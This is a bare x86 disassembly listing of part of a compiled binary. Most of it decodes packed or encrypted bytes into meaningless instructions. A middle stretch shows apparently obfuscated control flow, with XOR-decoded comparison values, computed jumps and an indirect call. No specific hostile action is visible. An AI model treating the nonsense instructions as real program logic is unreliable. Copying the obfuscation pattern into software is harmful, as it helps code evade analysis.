  40cde6:	ret    0x2fb
  40cde9:	popa   
  40cdea:	push   esp
  40cdeb:	pop    esi
  40cdec:	dec    ebp
  40cded:	loopne 0x40cd8a
  40cdef:	xor    DWORD PTR [ecx],edi
  40cdf1:	imul   esi,DWORD PTR [ebx-0x11],0x2ea9ae71
  40cdf8:	(bad)  
  40cdf9:	call   0xb841:0xb6ed2ff4
  40ce00:	repz push ds
  40ce02:	dec    esp
  40ce03:	aas    
  40ce04:	xor    esi,DWORD PTR [ebx]
  40ce06:	adc    BYTE PTR [esi+0xb],dl
  40ce09:	xchg   esp,eax
  40ce0a:	mov    ebx,0x518c8e33
  40ce0f:	out    dx,al
  40ce10:	xor    DWORD PTR [ecx],esi
  40ce12:	loopne 0x40cdef
  40ce14:	out    dx,eax
  40ce15:	push   ebx
  40ce16:	add    al,0xa3
  40ce18:	cmp    al,0xd9
  40ce1a:	or     DWORD PTR [ebx+0x6a3c95ee],edi
  40ce20:	mov    eax,0xd99d0558
  40ce25:	xor    al,0xf5
  40ce27:	ins    DWORD PTR es:[edi],dx
  40ce28:	outs   dx,BYTE PTR ds:[esi]
  40ce29:	xchg   esp,eax
  40ce2a:	mov    al,ds:0x24cf345d
  40ce2f:	pop    ebx
  40ce30:	mov    bl,0x6a
  40ce32:	pop    ds
  40ce33:	xchg   edi,eax
  40ce34:	and    ebx,DWORD PTR [edi]
  40ce36:	lods   eax,DWORD PTR ds:[esi]
  40ce37:	pop    edx
  40ce38:	push   es
  40ce39:	adc    eax,0xa8dcf7a3
  40ce3e:	cmp    ah,0xf
  40ce41:	int    0x9d
  40ce43:	push   0x77
  40ce45:	icebp  
  40ce46:	xchg   ecx,eax
  40ce47:	ins    DWORD PTR es:[edi],dx
  40ce48:	jbe    0x40ce42
  40ce4a:	(bad)  
  40ce4b:	std    
  40ce4c:	clc    
  40ce4d:	xchg   BYTE PTR [ebx+0x4fe580de],dh
  40ce53:	dec    edx
  40ce54:	cli    
  40ce55:	repnz adc eax,DWORD PTR [ebx]
  40ce58:	mov    BYTE PTR [ebx+0x7a72fbbe],dh
  40ce5e:	xor    DWORD PTR [eax+ebp*1-0x73334b38],eax
  40ce65:	aas    
  40ce66:	leave  
  40ce67:	ss pushf 
  40ce69:	loope  0x40ce95
  40ce6b:	push   eax
  40ce6c:	mov    BYTE PTR [edi],cl
  40ce6e:	(bad)  
  40ce6f:	xor    al,BYTE PTR [ebp-0x4]
  40ce72:	jbe    0x40ce91
  40ce74:	jb     0x40cea7
  40ce76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce77:	jecxz  0x40ce89
  40ce79:	stos   BYTE PTR es:[edi],al
  40ce7a:	xchg   esi,eax
  40ce7b:	div    DWORD PTR [esi-0x5d1cffc6]
  40ce81:	adc    bl,BYTE PTR fs:0x55d9f3fd
  40ce88:	push   ds
  40ce89:	xor    esi,DWORD PTR [ecx]
  40ce8b:	hlt    
  40ce8c:	mov    ?,edx
  40ce8e:	inc    ebx
  40ce8f:	fwait
  40ce90:	inc    edx
  40ce91:	lahf   
  40ce92:	imul   edx,DWORD PTR [ecx+0x23bca9a3],0xf2847d98
  40ce9c:	inc    ebp
  40ce9d:	push   eax
  40ce9e:	inc    esp
  40ce9f:	int    0xae
  40cea1:	sahf   
  40cea2:	mov    dl,bh
  40cea4:	dec    edi
  40cea5:	les    ebp,FWORD PTR [edx+0x1d5c0505]
  40ceab:	mov    dh,0x9f
  40cead:	les    esp,FWORD PTR [eax]
  40ceaf:	popa   
  40ceb0:	mov    al,ds:0xf3a3e38b
  40ceb5:	in     al,0xa3
  40ceb7:	jnp    0x40cef7
  40ceb9:	test   al,0x7a
  40cebb:	pop    ss
  40cebc:	nop
  40cebd:	retf   
  40cebe:	mov    edi,eax
  40cec0:	push   ebp
  40cec1:	gs pop ebp
  40cec3:	cli    
  40cec4:	ret    
  40cec5:	inc    esp
  40cec6:	aad    0xf0
  40cec8:	or     edi,ecx
  40ceca:	adc    dh,BYTE PTR [esi+ebx*4]
  40cecd:	sbb    DWORD PTR [eax+edi*8-0x7cf11dbf],0xbd758d4f
  40ced8:	xchg   edi,eax
  40ced9:	int3   
  40ceda:	cld    
  40cedb:	cmp    DWORD PTR ds:0x55738c22,esi
  40cee1:	retf   0xf54d
  40cee4:	fs fsincos 
  40cee7:	js     0x40cf4a
  40cee9:	(bad)  
  40ceea:	cmp    cl,BYTE PTR [eax+esi*2]
  40ceed:	test   eax,0x6b916c22
  40cef2:	push   ebp
  40cef3:	xchg   DWORD PTR [esp+edx*4],esi
  40cef6:	mov    eax,0x6c994c36
  40cefb:	fcom   DWORD PTR [eax+0x3]
  40cefe:	sti    
  40ceff:	icebp  
  40cf00:	push   ss
  40cf01:	mov    edx,0xe0568c5f
  40cf06:	stos   BYTE PTR es:[edi],al
  40cf07:	inc    eax
  40cf08:	xor    eax,0xf2fa1db9
  40cf0d:	pop    ds
  40cf0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf0f:	arpl   WORD PTR [ecx+0x1d6efbcd],cx
  40cf15:	rcr    BYTE PTR [ebp+0x41102b70],cl
  40cf1b:	adc    DWORD PTR [ebp+0x41f1f796],0x6a
  40cf22:	mov    WORD PTR [ebx+0x38],fs
  40cf25:	hlt    
  40cf26:	xor    cl,BYTE PTR [eax]
  40cf28:	jbe    0x40cf66
  40cf2a:	pop    ecx
  40cf2b:	mov    ebp,0x98e93e74
  40cf30:	mov    ds:0xb0a69cd5,al
  40cf35:	push   es
  40cf36:	mov    DWORD PTR [ebx-0x69],ebp
  40cf39:	push   esi
  40cf3a:	dec    esi
  40cf3b:	xchg   DWORD PTR [ecx-0x44],esp
  40cf3e:	xlat   BYTE PTR ds:[ebx]
  40cf3f:	sbb    al,0x9
  40cf41:	repnz sbb DWORD PTR [eax],edx
  40cf44:	in     eax,dx
  40cf45:	sub    BYTE PTR ds:0x31cb9e27,bl
  40cf4b:	xor    eax,0xc7568b1f
  40cf50:	sbb    DWORD PTR [ebx-0x14],0xbb4550bf
  40cf57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf58:	and    BYTE PTR [eax],dh
  40cf5a:	es cmp eax,ebx
  40cf5d:	dec    ebx
  40cf5e:	mov    ch,0x67
  40cf60:	mov    esp,DWORD PTR [edx-0x5e]
  40cf63:	xor    ebp,DWORD PTR [eiz*1+0x29457c88]
  40cf6a:	and    cl,BYTE PTR [ecx]
  40cf6c:	jno    0x40cfc7
  40cf6e:	sub    cl,BYTE PTR [edx]
  40cf70:	jne    0x40cf8b
  40cf72:	je     0x40cfa7
  40cf74:	push   cs
  40cf75:	inc    eax
  40cf76:	repnz sub ah,bh
  40cf79:	mov    ebp,0x812cf01f
  40cf7e:	push   ebx
  40cf7f:	sbb    DWORD PTR [edi+0x11],ebp
  40cf82:	mov    esp,esp
  40cf84:	(bad)  
  40cf85:	pop    ecx
  40cf86:	or     DWORD PTR [ebx-0x59fb36b6],eax
  40cf8c:	jle    0x40cfa4
  40cf8e:	jae    0x40cf30
  40cf90:	cli    
  40cf91:	(bad)  
  40cf92:	mov    esi,0x37cef9f7
  40cf97:	push   ss
  40cf98:	popa   
  40cf99:	and    esi,ebp
  40cf9b:	add    DWORD PTR [ebx+0x43b05d42],eax
  40cfa1:	xchg   ebp,eax
  40cfa2:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40cfa4:	push   ebx
  40cfa5:	jecxz  0x40cffb
  40cfa7:	mov    ebx,0xfbc55bdf
  40cfac:	jns    0x40d013
  40cfae:	xchg   ebp,eax
  40cfaf:	ins    BYTE PTR es:[edi],dx
  40cfb0:	cmp    BYTE PTR [ecx+0x10f44f3a],cl
  40cfb6:	mov    ds:0x1b3f5ac1,al
  40cfbb:	dec    edi
  40cfbc:	mov    ecx,eax
  40cfbe:	cmc    
  40cfbf:	mov    ds:0x7b94d0fe,eax
  40cfc4:	push   cs
  40cfc5:	fld    QWORD PTR [esi-0x1e]
  40cfc8:	xchg   esi,eax
  40cfc9:	jmp    0x5d66:0xca8f5884
  40cfd0:	scas   eax,DWORD PTR es:[edi]
  40cfd1:	xchg   DWORD PTR [esi+0xf5c7f13],esi
  40cfd7:	cmp    cl,BYTE PTR [ecx-0x7a15169a]
  40cfdd:	and    cl,BYTE PTR [eax]
  40cfdf:	cmp    eax,0xf093a39a
  40cfe4:	sub    ch,cl
  40cfe6:	mov    ah,0x6b
  40cfe8:	aaa    
  40cfe9:	or     dl,BYTE PTR [edx+0x342d1c8f]
  40cfef:	xchg   esp,eax
  40cff0:	inc    esp
  40cff1:	sub    al,al
  40cff3:	shl    ebp,0xfa
  40cff6:	(bad)  
  40cff7:	inc    ebx
  40cff8:	pop    ds
  40cff9:	sub    cl,BYTE PTR [edx-0x42b9d91e]
  40cfff:	aaa    
  40d000:	rcl    DWORD PTR [edx+0x30],0x5b
  40d004:	dec    ecx
  40d005:	sbb    eax,edi
  40d007:	enter  0xea6a,0x98
  40d00b:	les    esi,FWORD PTR [ebp+0x1e]
  40d00e:	or     DWORD PTR [edx],0x22
  40d011:	and    ch,BYTE PTR [edx-0x50]
  40d014:	push   esi
  40d015:	adc    esp,DWORD PTR ds:0x9b59fa6f
  40d01b:	retf   0xb496
  40d01e:	push   edx
  40d01f:	mov    ch,0xc4
  40d021:	inc    ebx
  40d022:	ins    DWORD PTR es:[edi],dx
  40d023:	std    
  40d024:	(bad)  
  40d025:	int    0x97
  40d027:	xchg   esi,eax
  40d028:	mov    al,ds:0x95350732
  40d02d:	cli    
  40d02e:	adc    ebx,DWORD PTR ds:0x26bddc67
  40d034:	test   al,0x4
  40d036:	vmwrite ebx,DWORD PTR [esi-0x7c]
  40d03a:	cwde   
  40d03b:	dec    ebx
  40d03c:	mov    ecx,0x5d4d531e
  40d041:	sub    cl,bh
  40d043:	shl    bh,0x79
  40d046:	popf   
  40d047:	loope  0x40d0a0
  40d049:	sahf   
  40d04a:	sbb    al,0x43
  40d04c:	loop   0x40cff0
  40d04e:	test   al,0x82
  40d050:	std    
  40d051:	sub    DWORD PTR [edx],esp
  40d053:	in     al,0xe8
  40d055:	test   eax,0x853da0f6
  40d05a:	out    0x7e,al
  40d05c:	and    BYTE PTR [eax+0x48705824],bh
  40d062:	test   al,0x8b
  40d064:	dec    ebp
  40d065:	or     BYTE PTR [ecx+0x42a2b61d],al
  40d06b:	add    dl,dl
  40d06d:	mov    ds:0x48030042,al
  40d072:	and    al,0x81
  40d074:	and    eax,0x42a2de
  40d079:	adc    eax,DWORD PTR ss:[eax]
  40d07c:	add    BYTE PTR [ecx+0x458bcc4d],cl
  40d082:	in     al,dx
  40d083:	mov    ecx,DWORD PTR [ebp+0x8]
  40d086:	add    DWORD PTR ds:0x42a276,0x42a2a6
  40d090:	add    ecx,DWORD PTR [eax+0x1c]
  40d093:	mov    DWORD PTR ds:0x42a2ae,0x5cb0
  40d09d:	mov    DWORD PTR [ebp-0x14],ecx
  40d0a0:	mov    DWORD PTR ds:0x42a2f2,0x755c
  40d0aa:	jmp    0x40d194
  40d0af:	or     eax,ecx
  40d0b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40d0b4:	xor    ecx,0x90a
  40d0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40d0bd:	adc    DWORD PTR ds:0x42a28e,0x25cc
  40d0c7:	add    ecx,DWORD PTR [eax+ebx*4]
  40d0ca:	mov    DWORD PTR [ebp-0x28],ecx
  40d0cd:	xor    eax,0x75c
  40d0d2:	mov    eax,DWORD PTR [ebp-0x4]
  40d0d5:	mov    ecx,DWORD PTR [ebp-0x28]
  40d0d8:	xor    eax,esi
  40d0da:	and    DWORD PTR ds:0x42a2ae,0x42a2c2
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ea,0x1030
  40d0f0:	cmp    ecx,eax
  40d0f2:	mov    DWORD PTR ds:0x42a2c6,0xfb7
  40d0fc:	je     0x40d194
  40d102:	mov    DWORD PTR ds:0x42a262,0xed5
  40d10c:	jmp    0x40d185
  40d111:	and    DWORD PTR ds:0x42a2e2,0x0
  40d11b:	jmp    0x40d12d
  40d120:	mov    ecx,DWORD PTR ds:0x42a2e2
  40d126:	inc    ecx
  40d127:	mov    DWORD PTR ds:0x42a2e2,ecx
  40d12d:	cmp    DWORD PTR ds:0x42a2e2,0x10
  40d134:	jae    0x40d161
  40d13a:	cmp    DWORD PTR ds:0x42a2e2,0x15
  40d141:	jle    0x40d161
  40d147:	jmp    0x40d15c
  40d14c:	push   0x42a2ae
  40d151:	push   0x429181
  40d156:	call   DWORD PTR ds:0x42a3ca
  40d15c:	jmp    0x40d120
  40d161:	mov    eax,DWORD PTR [ebp-0x4]
  40d164:	mov    ecx,DWORD PTR [ebp-0x8]
  40d167:	xor    eax,esi
  40d169:	add    eax,edi
  40d16b:	cmp    ecx,eax
  40d16d:	mov    eax,DWORD PTR [ebp-0x4]
  40d170:	je     0x40d1cf
  40d176:	mov    ecx,DWORD PTR [ebp-0x30]
  40d179:	xor    eax,esi
  40d17b:	add    eax,edi
  40d17d:	cmp    ecx,eax
  40d17f:	je     0x40d1d8
  40d185:	lea    eax,[ebp-0x8]
  40d188:	push   eax
  40d189:	push   DWORD PTR [ebp-0x28]
  40d18c:	push   DWORD PTR [ebp+0xc]
  40d18f:	call   0x41622a
  40d194:	mov    eax,DWORD PTR [ebp-0x4]
  40d197:	mov    ecx,DWORD PTR [ebp-0x8]
  40d19a:	xor    eax,esi
  40d19c:	add    eax,edi
  40d19e:	cmp    ecx,eax
  40d1a0:	je     0x40d1bb
  40d1a6:	mov    eax,DWORD PTR [ebp-0x34]
  40d1a9:	movzx  eax,WORD PTR [eax+ebx*2]
  40d1ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40d1b0:	mov    eax,DWORD PTR [ecx+eax*4]
  40d1b3:	mov    DWORD PTR [ebp-0x38],eax
  40d1b6:	jmp    0x40d111
  40d1bb:	mov    eax,DWORD PTR [ebp-0xc]
  40d1be:	xor    eax,esi
  40d1c0:	lea    ebx,[ebx+eax*1+0x3272f1]
  40d1c7:	jmp    0x40872d
  40d1cc:	mov    eax,DWORD PTR [ebp-0x4]
  40d1cf:	xor    eax,esi
  40d1d1:	add    eax,edi
  40d1d3:	jmp    0x413da1
  40d1d8:	mov    eax,DWORD PTR [ebp-0x38]
  40d1db:	add    eax,DWORD PTR [ebp+0x8]
  40d1de:	mov    DWORD PTR [ebp-0x18],eax
  40d1e1:	mov    eax,DWORD PTR [ebp-0x1c]
  40d1e4:	test   eax,eax
  40d1e6:	je     0x40f60e
  40d1ec:	mov    DWORD PTR [ebp-0x20],0x0
  40d1f3:	push   0x3
  40d1f5:	xor    edx,edx
  40d1f7:	pop    edx
  40d1f8:	add    edx,0x8
  40d1fb:	push   edx
  40d1fc:	pop    ecx
  40d1fd:	push   0x6
  40d1ff:	dec    ecx
  40d200:	pop    ebx
  40d201:	dec    ebx
  40d202:	xchg   ebx,ecx
  40d204:	sub    ebx,ecx
  40d206:	xchg   ebx,ecx
  40d208:	dec    ecx
  40d209:	mov    eax,DWORD PTR [ebp-0x1c]
  40d20c:	imul   eax,ecx
  40d20f:	sub    esp,eax
  40d211:	mov    DWORD PTR [ebp-0x20],esp
  40d214:	mov    eax,DWORD PTR [ebp-0x4]
  40d217:	xor    eax,esi
  40d219:	add    eax,edi
  40d21b:	jmp    0x40f5e7
  40d220:	mov    ecx,DWORD PTR [ebp-0xc]
  40d223:	mov    eax,DWORD PTR [ebp+0x8]
  40d226:	mov    edx,DWORD PTR [ebp+0x14]
  40d229:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d22d:	xor    ecx,esi
  40d22f:	add    ecx,edi
  40d231:	xor    edx,edx
  40d233:	div    ecx
  40d235:	mov    ecx,DWORD PTR [ebp-0x4]
  40d238:	jmp    0x40f5c6
  40d23d:	adc    esp,DWORD PTR [eax-0x55]
  40d240:	jl     0x40d1c2
  40d242:	mov    eax,0x95ec0084
  40d247:	bound  ebp,QWORD PTR [ecx+0x7f]
  40d24a:	int    0x42
  40d24c:	aam    0xe9
  40d24e:	rol    DWORD PTR [ebx-0x7ca1f37d],cl
  40d254:	add    DWORD PTR [esi],0xffffff87
  40d257:	xor    al,BYTE PTR [esi]
  40d259:	sbb    eax,0x1e052c75
  40d25e:	ror    BYTE PTR ds:[esi+0x26],1
  40d262:	hlt    
  40d263:	neg    DWORD PTR [edi+0x4ce92214]
  40d269:	inc    ecx
  40d26a:	rcl    BYTE PTR [eax-0x484d0d5d],0xe
  40d271:	rcr    DWORD PTR [ebx+0x54],cl
  40d274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d275:	popf   
  40d276:	push   ecx
  40d277:	sub    al,0x10
  40d279:	lea    ebp,[esi+0x7]
  40d27c:	dec    edi
  40d27d:	mov    cl,0x2d
  40d27f:	fld    QWORD PTR [esi+0x6e24cfd1]
  40d285:	in     al,dx
  40d286:	ss dec eax
  40d288:	repz pop ss
  40d28a:	cmc    
  40d28b:	mov    ebp,0x6e2d16c0
  40d290:	cmp    BYTE PTR [edi+ecx*2+0x222bc9b9],ah
  40d297:	and    ebx,eax
  40d299:	test   DWORD PTR [edi],0xcdf89866
  40d29f:	add    ah,BYTE PTR [ecx]
  40d2a1:	xor    eax,0x933d73e5
  40d2a6:	pop    esp
  40d2a7:	jge    0x40d232
  40d2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2aa:	push   eax
  40d2ab:	(bad)  
  40d2ad:	mov    ds:0xd96fa0f8,eax
  40d2b2:	push   edx
  40d2b3:	add    esi,DWORD PTR [ebp+0x6a]
  40d2b6:	sub    al,0xfb
  40d2b8:	jp     0x40d2f4
  40d2ba:	dec    edx
  40d2bb:	daa    
  40d2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bd:	jg     0x40d263
  40d2bf:	out    dx,al
  40d2c0:	(bad)  
  40d2c1:	sub    ah,BYTE PTR [eax-0x31bf8e12]
  40d2c7:	mov    cs,WORD PTR [esi+esi*4+0x226e7ecc]
  40d2ce:	div    DWORD PTR [ecx+esi*2+0x6c283384]
  40d2d5:	lods   eax,DWORD PTR ds:[esi]
  40d2d6:	push   edi
  40d2d7:	lods   eax,DWORD PTR ds:[esi]
  40d2d8:	ins    DWORD PTR es:[edi],dx
  40d2d9:	pop    esi
  40d2da:	pop    es
  40d2db:	test   DWORD PTR [edx+edi*2],0xb4c11735
  40d2e2:	push   ebx
  40d2e3:	mov    eax,ds:0xd4059ffb
  40d2e8:	push   0x17
  40d2ea:	clc    
  40d2eb:	sahf   
  40d2ec:	jle    0x40d361
  40d2ee:	sub    bl,BYTE PTR [ecx+0x5eb9f9d5]
  40d2f4:	jp     0x40d2cc
  40d2f6:	out    dx,al
  40d2f7:	stos   DWORD PTR es:[edi],eax
  40d2f8:	xchg   edi,eax
  40d2f9:	fwait
  40d2fa:	setg   bl
  40d2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2fe:	fimul  WORD PTR [ebx+0xf]
  40d301:	add    ah,ch
  40d303:	and    bh,dh
  40d305:	sbb    DWORD PTR [eax-0x77f45dc8],0xffffffc3
  40d30c:	cmp    eax,ebp
  40d30e:	mov    bl,0xf2
  40d310:	add    DWORD PTR [esi+0x0],edi
  40d313:	fisub  DWORD PTR [ebp+0x5a3a7b99]
  40d319:	lock int3 
  40d31b:	add    BYTE PTR [ecx],dh
  40d31d:	fadd   QWORD PTR [esi]
  40d31f:	loop   0x40d33b
  40d321:	or     ecx,eax
  40d323:	ret    
  40d324:	sbb    eax,0xba24cd49
  40d329:	xor    BYTE PTR [eax],0x9d
  40d32c:	dec    ebp
  40d32d:	dec    ebx
  40d32e:	mov    ah,0xda
  40d330:	mov    ch,0x72
  40d332:	das    
  40d333:	adc    BYTE PTR [edi],bh
  40d335:	adc    al,0x47
  40d337:	push   edi
  40d338:	or     al,0x17
  40d33a:	out    0x67,eax
  40d33c:	shl    BYTE PTR [eax],cl
  40d33e:	popf   
  40d33f:	pop    es
  40d340:	jmp    0x66a0af5b
  40d345:	pop    eax
  40d346:	mov    esp,0xe5e17ce2
  40d34b:	test   BYTE PTR [ebx],dl
  40d34d:	pop    es
  40d34e:	mov    bh,0xcf
  40d350:	inc    eax
  40d351:	ds out 0x8c,al
  40d354:	int3   
  40d355:	into   
  40d356:	sub    eax,edi
  40d358:	stc    
  40d359:	cmp    BYTE PTR [ebp+0x23],ah
  40d35c:	adc    eax,0xd6b55682
  40d361:	popa   
  40d362:	cmp    esi,DWORD PTR [eax]
  40d364:	hlt    
  40d365:	or     BYTE PTR [edi],al
  40d367:	in     al,dx
  40d368:	fld    TBYTE PTR [edi]
  40d36a:	inc    edx
  40d36b:	jge    0x40d357
  40d36d:	adc    eax,0xe2fa301e
  40d372:	inc    ebp
  40d373:	inc    eax
  40d374:	and    DWORD PTR [esi],0xfa25f668
  40d37a:	sbb    ah,bl
  40d37c:	cmp    ebx,esp
  40d37e:	and    eax,edx
  40d380:	inc    edx
  40d381:	sub    al,0x86
  40d383:	nop
  40d384:	icebp  
  40d385:	ja     0x40d3d9
  40d387:	lahf   
  40d388:	(bad)  
  40d389:	adc    bh,dl
  40d38b:	add    dl,BYTE PTR [esi-0x2f]
  40d38e:	xchg   BYTE PTR [ebp+eax*4+0x19517357],dh
  40d395:	mov    edi,0x2a317f36
  40d39a:	push   ebp
  40d39b:	jecxz  0x40d39f
  40d39d:	pop    edx
  40d39e:	jbe    0x40d352
  40d3a0:	bswap  eax
  40d3a2:	sbb    edi,DWORD PTR [esi]
  40d3a4:	add    edi,DWORD PTR ds:0x765de688
  40d3aa:	mov    dh,0x4c
  40d3ac:	and    cl,BYTE PTR [ebx+0x363f92a8]
  40d3b2:	mov    edi,0xda573ef9
  40d3b7:	jbe    0x40d342
  40d3b9:	mov    al,ds:0x5f3687bb
  40d3be:	repz daa 
  40d3c0:	les    ebp,FWORD PTR [esi+0x3767349a]
  40d3c6:	sbb    DWORD PTR [esi],eax
  40d3c8:	mov    dl,0x4e
  40d3ca:	mov    esi,0x5c4c9599
  40d3cf:	pop    ds
  40d3d0:	inc    eax
  40d3d1:	push   cs
  40d3d2:	in     al,dx
  40d3d3:	loope  0x40d3ac
  40d3d5:	idiv   BYTE PTR [esi-0x2cac5bf]
  40d3db:	mov    ds:0x62794cf2,al
  40d3e0:	dec    esp
  40d3e1:	cmp    eax,0x85e31387
  40d3e6:	ror    BYTE PTR ds:0x8bf655b6,0xb3
  40d3ed:	fnstenv [ebx+0x6e]
  40d3f0:	and    BYTE PTR [esi+0x7a],dh
  40d3f3:	inc    esp
  40d3f4:	inc    esi
  40d3f5:	in     eax,dx
  40d3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f7:	or     esp,DWORD PTR [edx+0x48]
  40d3fa:	jge    0x40d3ca
  40d3fc:	mov    BYTE PTR [ebx+0x47bc1501],ah
  40d402:	pop    edi
  40d403:	mov    ecx,0x22f69f9
  40d408:	or     edx,DWORD PTR [ebx+0x43]
  40d40b:	mov    al,0xc0
  40d40d:	xchg   esi,eax
  40d40e:	aaa    
  40d40f:	push   es
  40d410:	and    BYTE PTR [edi],dh
  40d412:	je     0x40d3ab
  40d414:	and    cl,BYTE PTR [edi+0x41d6b877]
  40d41a:	inc    esi
  40d41b:	loopne 0x40d443
  40d41d:	fcomp  QWORD PTR ds:0x50682db1
  40d423:	jbe    0x40d3b2
  40d425:	fistp  QWORD PTR [ecx-0x6ac192b0]
  40d42b:	arpl   si,ax
  40d42d:	push   0xffffffce
  40d42f:	scas   eax,DWORD PTR es:[edi]
  40d430:	(bad)  
  40d431:	mov    al,ds:0x968235e0
  40d436:	or     bh,BYTE PTR [edi-0x77dd9451]
  40d43c:	xchg   ecx,eax
  40d43d:	in     al,0xf9
  40d43f:	or     BYTE PTR [ebp+ebx*1+0xf],0x70
  40d444:	ret    
  40d445:	fld    TBYTE PTR ds:[edi+0x28a7179d]
  40d44c:	divps  xmm0,XMMWORD PTR [esp+eax*2+0x51797e70]
  40d454:	and    ch,cl
  40d456:	test   BYTE PTR [edx-0x23999abd],bl
  40d45c:	test   al,0x7b
  40d45e:	aad    0xbf
  40d460:	fistp  WORD PTR [ebx+0x79]
  40d463:	and    esp,DWORD PTR [ebp+0x54]
  40d466:	out    dx,al
  40d467:	mov    ds:0x194445d3,eax
  40d46c:	std    
  40d46d:	adc    ah,BYTE PTR [edi]
  40d46f:	or     BYTE PTR [ebp+0x44],dh
  40d472:	ret    
  40d473:	push   es
  40d474:	mov    ebp,0x2bda8454
  40d479:	mov    eax,ds:0xed3be881
  40d47e:	push   es
  40d47f:	push   cs
  40d480:	and    edx,DWORD PTR [esi+edi*2-0x7f]
  40d484:	dec    esp
  40d485:	xchg   ecx,eax
  40d486:	xlat   BYTE PTR ds:[ebx]
  40d487:	daa    
  40d488:	mov    al,ds:0x77e47f1a
  40d48d:	xchg   BYTE PTR [eax+0x6e],ah
  40d490:	retf   0xc8fe
  40d493:	add    al,0x17
  40d495:	lahf   
  40d496:	jnp    0x40d4a5
  40d498:	push   ss
  40d499:	es clc 
  40d49b:	pop    esi
  40d49c:	fisub  WORD PTR [ebx+0x6b]
  40d49f:	jmp    0x8896:0xb217c0fa
  40d4a6:	jnp    0x40d42b
  40d4a8:	pop    edx
  40d4a9:	out    dx,eax
  40d4aa:	adc    al,0x7d
  40d4ac:	icebp  
  40d4ad:	enter  0xf716,0xef
  40d4b1:	xacquire xchg DWORD PTR [edx],esp
  40d4b4:	lahf   
  40d4b5:	mov    bl,0x45
  40d4b7:	inc    edi
  40d4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b9:	push   es
  40d4ba:	add    al,0xb3
  40d4bc:	or     ah,bl
  40d4be:	loop   0x40d45c
  40d4c0:	inc    ebp
  40d4c1:	shld   DWORD PTR [ebp-0x35],esi,0x43
  40d4c6:	mov    BYTE PTR [eax],bh
  40d4c8:	xchg   esp,eax
  40d4c9:	jb     0x40d53c
  40d4cb:	pop    edi
  40d4cc:	push   0xff7cc4c0
  40d4d1:	jecxz  0x40d49c
  40d4d3:	jo     0x40d495
  40d4d5:	inc    ebp
  40d4d6:	test   BYTE PTR ds:0x2e665642,bh
  40d4dc:	pop    ebp
  40d4dd:	ror    DWORD PTR [ecx],0x8c
  40d4e0:	xor    DWORD PTR [edi],esi
  40d4e2:	mov    dl,0x36
  40d4e4:	xchg   edx,eax
  40d4e5:	lea    ebp,[ebx-0x15f6f7a6]
  40d4eb:	inc    ebx
  40d4ec:	pop    esp
  40d4ed:	lods   al,BYTE PTR ds:[esi]
  40d4ee:	mov    edx,0x82dbeab3
  40d4f3:	add    BYTE PTR [ecx],al
  40d4f5:	call   0x2529:0x228627b8
  40d4fc:	cmp    eax,0x683f7e24
  40d501:	rol    BYTE PTR [edi],1
  40d503:	mov    ds:0xd057a9c1,eax
  40d508:	data16 fdivr st,st(4)
  40d50b:	test   DWORD PTR [ebp-0x1edca658],eax
  40d511:	ret    
  40d512:	es scas al,BYTE PTR es:[edi]
  40d514:	fld    TBYTE PTR [eax-0x5f]
  40d517:	cmp    eax,0x978c2c4f
  40d51c:	mov    bh,0x39
  40d51e:	xor    al,0x7d
  40d520:	hlt    
  40d521:	cmp    ebp,DWORD PTR [edi+0x3f]
  40d524:	inc    ebx
  40d525:	sbb    DWORD PTR [edi-0xf],eax
  40d528:	or     ebx,DWORD PTR ds:0x9839dc19
  40d52e:	mov    ebx,0xb25a2be8
  40d533:	sbb    DWORD PTR ds:0xad43ea83,0xffffff98
  40d53a:	shl    ebx,1
  40d53c:	loope  0x40d589
  40d53e:	xor    ecx,ebp
  40d540:	(bad)  
  40d541:	int3   
  40d542:	jbe    0x40d5bf
  40d544:	arpl   WORD PTR [ebx],si
  40d546:	stos   BYTE PTR es:[edi],al
  40d547:	loopne 0x40d531
  40d549:	es je  0x40d5a7
  40d54c:	repz test al,0x7a
  40d54f:	xchg   edi,eax
  40d550:	(bad)  
  40d551:	aas    
  40d552:	(bad)  
  40d553:	into   
  40d554:	push   ecx
  40d555:	or     DWORD PTR [edx+0x3],0xffffffa9
  40d559:	inc    edi
  40d55a:	xor    ebp,esp
  40d55c:	mov    ds,WORD PTR ds:0xf2824fb4
  40d562:	adc    BYTE PTR [ebx],al
  40d564:	xor    BYTE PTR [ebp+0x10],bh
  40d567:	enter  0x44e8,0x20
  40d56b:	cmc    
  40d56c:	push   ebx
  40d56d:	out    dx,al
  40d56e:	jne    0x40d511
  40d570:	in     eax,dx
  40d571:	mov    cl,0x7a
  40d573:	sbb    dl,BYTE PTR [ebp-0x11]
  40d576:	dec    ebp
  40d577:	in     al,dx
  40d578:	in     al,0x4e
  40d57a:	shl    DWORD PTR [ebx-0x8],0x59
  40d57e:	in     eax,0xbc
  40d580:	dec    edi
  40d581:	jb     0x40d547
  40d583:	mov    edi,0x7393b1ca
  40d588:	adc    BYTE PTR ds:0xb4b21545,bl
  40d58e:	push   ecx
  40d58f:	jg     0x4ee79ed
  40d595:	ror    bl,1
  40d597:	test   eax,0xaf97214
  40d59c:	out    0x17,al
  40d59e:	inc    edi
  40d59f:	inc    ecx
  40d5a0:	push   cs
  40d5a1:	xchg   esi,eax
  40d5a2:	stos   DWORD PTR es:[edi],eax
  40d5a3:	ror    BYTE PTR [esi-0x45ae1a5e],cl
  40d5a9:	xchg   esp,eax
  40d5aa:	dec    ebx
  40d5ab:	scas   al,BYTE PTR es:[edi]
  40d5ac:	xor    BYTE PTR [ebx-0x51],dl
  40d5af:	cmp    BYTE PTR [ebp-0x51],bh
  40d5b2:	call   0xcfa6b90c
